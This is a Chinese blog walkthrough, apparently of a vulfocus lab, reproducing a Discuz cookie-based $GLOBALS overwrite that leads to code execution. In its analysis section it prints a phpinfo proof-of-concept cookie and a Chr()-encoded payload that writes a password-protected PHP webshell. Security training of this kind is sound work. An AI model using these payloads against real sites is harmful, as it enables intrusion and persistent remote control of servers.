# 原创
：  【漏洞复现-discuz-wooyun-命令执行】vulfocus/discuz-wooyun_2010_080723

# 【漏洞复现-discuz-wooyun-命令执行】vulfocus/discuz-wooyun_2010_080723

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）检索隐藏数据（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|命令、代码执行博文|目标|状态
|[【漏洞复现-jupyter_notebook-命令执行】vulfocus/jupyter_notebook-cve_2019_9644](https://blog.csdn.net/qq_53079406/article/details/127491074)|发现功能点上的命令执行|已发布
|[【漏洞复现-solr-命令执行】vulfocus/solr-cve_2019_17558](https://blog.csdn.net/qq_53079406/article/details/127332723)|寻找模板（接口、配置文件）的命令执行漏洞|已发布
|[【漏洞复现-seaCms-命令执行】vulfocus/seacms-cnvd_2020_22721](https://blog.csdn.net/qq_53079406/article/details/127329791)|写入可执行文件|已发布
|[【漏洞复现-maccms-命令执行】vulfocus/maccms-cve_2017_17733](https://blog.csdn.net/qq_53079406/article/details/127328882)|参数中写入命令（加密）|已发布
|[【漏洞复现-webmin-命令执行】vulfocus/webmin-cve_2019_15107](https://blog.csdn.net/qq_53079406/article/details/127326071)|拼接执行命令|已发布
|[【漏洞复现-thinkphp-命令执行】vulfocus/thinkphp-3.2.x](https://blog.csdn.net/qq_53079406/article/details/127324775)|写入错误日志中|已发布
|[【漏洞复现-Discuz-代码执行】Discuz_CVE-2019-13956](https://blog.csdn.net/qq_53079406/article/details/127305443)|cookie中植入|已发布
|[【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339](https://blog.csdn.net/qq_53079406/article/details/127301708)|后台配置中植入命令|已发布
|[【漏洞复现-thinkphp-代码执行】vulfocus/thinkphp-cve_2018_1002015](https://blog.csdn.net/qq_53079406/article/details/127318349?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167298893316782425134312%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167298893316782425134312&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127318349-null-null.blog_rank_default&amp;utm_term=1002015&amp;spm=1018.2226.3001.4450)|thinkphp命令执行|已发布
|[【漏洞复现-discuz-wooyun-命令执行】vulfocus/discuz-wooyun_2010_080723](https://blog.csdn.net/qq_53079406/article/details/127312277?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167298948216782425142045%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167298948216782425142045&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127312277-null-null.blog_rank_default&amp;utm_term=080723&amp;spm=1018.2226.3001.4450)|cookie中命令执行|已发布
|更多复现漏洞将公布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[【漏洞复现-discuz-wooyun-命令执行】vulfocus/discuz-wooyun_2010_080723](https://vulfocus.cn/)
123.58.224.8:22709
123.58.224.8:26641
<img alt="" height="622" src="https://img-blog.csdnimg.cn/483c96c222a94bae8061bd6a5ff0d256.png" width="896"/>​

123.58.224.8:26641
<img alt="" height="917" src="https://img-blog.csdnimg.cn/989562e5b0094cc98d266f8c3686ba19.png" width="1200"/>​



> 
<h3>1.2、知识:</h3>
1、命令执行
PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当能控制这些函数中的参数时，就可将恶意系统命令拼接到正常命令中，从而造成命令执行攻击
2、$GLOBALS
引用全局作用域中可用的全部变量
关联数组 array，包含当前脚本内定义成全局范围的所有变量的引用。 数组的键就是变量的名字。
3、chr()码值表
返回值是当前整数对应的 ASCII 字符


> 
<h3>1.3、描述：</h3>
由于php版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
点击默认模板进入
<img alt="" height="896" src="https://img-blog.csdnimg.cn/ed1e0ccd85fd4a278db8e4cdc892f67b.png" width="1200"/>​
 随便点击一个通知（这里都是管理员发布的）
<img alt="" height="915" src="https://img-blog.csdnimg.cn/91fb0bad12de45aa99518b52779f059d.png" width="1200"/>​
<hr/>
phpinfo的POC
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
<img alt="" height="759" src="https://img-blog.csdnimg.cn/03db8ad3c2764d9ab91be05a1cfd9113.png" width="1200"/>​
 <img alt="" height="909" src="https://img-blog.csdnimg.cn/01b0916535a9458a93598d0d1243062f.png" width="1200"/>​
<hr/>
写入shell的POC
x.php密码pwd
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59));
<img alt="" height="760" src="https://img-blog.csdnimg.cn/7b50b2b8f9b44c71b3d89ce7f2ed66e5.png" width="1200"/>​
 <img alt="" height="803" src="https://img-blog.csdnimg.cn/af092931202a4e388c868ac589b96fd8.png" width="1200"/>​
 <img alt="" height="803" src="https://img-blog.csdnimg.cn/9149f28189e94de6b649e3cd14a04eb3.png" width="1200"/>​



---


> 
<h3>2.4、解题：</h3>
<img alt="" height="960" src="https://img-blog.csdnimg.cn/2890f6f56fe243919b10343015993cd0.png" width="1200"/>​

<img alt="" height="803" src="https://img-blog.csdnimg.cn/0ebdf7e4b7074d82b2ba2181cc870ac2.png" width="1200"/>​



---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

